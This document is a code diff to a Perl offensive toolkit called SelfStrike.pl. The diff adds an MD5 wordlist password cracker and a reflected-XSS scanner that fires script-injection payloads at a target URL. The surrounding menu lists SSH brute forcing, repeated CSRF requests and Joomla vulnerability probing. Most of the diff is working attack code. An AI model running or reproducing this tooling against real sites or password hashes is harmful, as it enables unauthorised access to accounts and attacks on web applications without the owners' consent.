@@ -7,6 +7,7 @@ use LWP::UserAgent;
 use Net::FTP;
 use Net::Ping;
 #use Net::SSH::Perl;
+use Digest::MD5 qw(md5_hex);
 
 my $modeuser="
 \n\n\n
@@ -36,6 +37,8 @@ SelfStrike.pl
  \n
  -t|type BruteForce-ssh -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in SSH*
  \n
+ -t|type BruteForce-MD5 -re 'MD5' -pass 'wordlist.txt' *Brute Force in MD5*
+ \n
  -t|type SelfStrike-CSRF -re|request 'q=1&s=1' -m|method 'GET|POST' -n|number '25' *Cross Site Request Fogery*
 	--- -m POST -re name=>'admin',password=>'123',auth=>'000'
  \n
@@ -45,6 +48,8 @@ SelfStrike.pl
  -t|type SelfStrike-Url -u|url 'deffy0h.tk' *Get Info WebSite*
  \n
  -t|type SelfStrike-Joomla -u|url 'deffy0h.tk' *Joomla Vulnerability*
+ \n
+ -t|type SelfStrike-XSS -u|url 'deffy0h.tk' -re 's=<p>xss</p>' *XSS Vulnerability*
  \n\n\n
 ";
 
@@ -160,8 +165,116 @@ if($type eq "SelfStrike-CSRF"    || $type eq "selfstrike-csrf"){
 if($type eq "SelfStrike-Joomla"    || $type eq "selfstrike-joomla"){
 &SelfStrike_Joomla
 }
+if($type eq "SelfStrike-XSS"    || $type eq "selfstrike-xss"){
+&SelfStrike_XSS
+}
+if($type eq "BruteForce-md5"    || $type eq "brutetorce-md5"){
+&BruteForce_md
+}
+
+sub BruteForce_md(){
+
+print "\n\n-=======================================================-\n";
+print "\t\t\tBruteForce-MD5\n";
+print "-=======================================================-\n\n";
+
+unless($REQ){
+$REQ="5f4dcc3b5aa765d61d8327deb882cf99";
+}
+
+if($REQ=~m/[?]/){
+$REQ="5f4dcc3b5aa765d61d8327deb882cf99";
+}
+
+if($pass=~m/.txt$/){
+print "[+] WORDLIST=> $pass\n";
+}
+
+print "[+] MD5=> $REQ\n";
+print "\n\n";
+my $c=0;
+open($a,"<",$pass)or die("\n\ncan not open file $pass\n\n");
+@pass=<$a>;
+while($c<scalar(@pass)){
+chomp(@pass[$c]);
+$mm=md5_hex(@pass[$c]);
+print "[+] MD5=>$mm\n";
+if($mm eq $REQ){
+
+print "\n\n\t\t\t SUCCESS \n";
+print "-=================================================================-\n";
+print "[+] MD5=> $mm\n";
+print "[+] PASSWORD=> @pass[$c]\n";
+print "-=================================================================-\n\n";
+exit;
+
+}
+$c++;
+}
+}
+
+sub SelfStrike_XSS(){
+
+
+print "\n\n-=======================================================-\n";
+print "\t\t\tSelfStrike-XSS\n";
+print "-=======================================================-\n\n";
+
+unless($url){
+print "\ntyping a DNS|URL -u 'site'\n";
+print $modeuser;
+exit;
+}
+
+if($url!~m/http:/){
+$url="http://$url";
+}
+
+my @xss=("?s=<p>XSS</p>&q=<p>XSS</p>&p=<p>XSS</p>","?s=<script>alert('XSS');</script>&q=<script>alert('XSS');</script>&p=<script>alert('XSS');</script>",$REQ,"?s=XSS&p=XSS&q=XSS");
+#reTe0
+my $tes="<p>XSS</p>";
+my $tess="<script>XSS</script>";
+
+my($tt)=$REQ=~m/=(.*?)/i;
+
+
+my $c=0;
+
+#=
+print $tt."\n";
+while($c<scalar(@xss)){
+my $rg=@xss[$c];
+if($rg!~m/[?]/){
+$rg="?".$rg;
+}
+my $yyy=$url.$rg;
+print "[+] conection to $yyy\n";
+$ua = LWP::UserAgent->new;
+if($re=HTTP::Request->new(GET=>$yyy)){
+$response=$ua->request($re);
+if($response->status_line==$OK_HTTP){
+my $htm=$response->decoded_content;
+if($htm=~$tes || $htm=~$tess || $htm=~m/XSS/){
+print "[+] $url have vulnerability in XSS\n\n";
+}else{
+print "[-] $url no have vulnerability in XSS\n\n";
+}
+}else{
+print "[-] FAIL\n\n";
+}
+}
+$c++;
+}
+
+}
 
 sub SelfStrike_Joomla(){
+
+
+print "\n\n-=======================================================-\n";
+print "\t\t\tSelfStrike-Joomla\n";
+print "-=======================================================-\n\n";
+
 unless($url){
 print "\ntyping a DNS|URL -u 'site'\n";
 print $modeuser;
@@ -943,97 +1056,3 @@ http://www.kammerl.de/ascii/AsciiSignature.php
 
 GeoLocalization:
 http://ip-api.com/json/
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
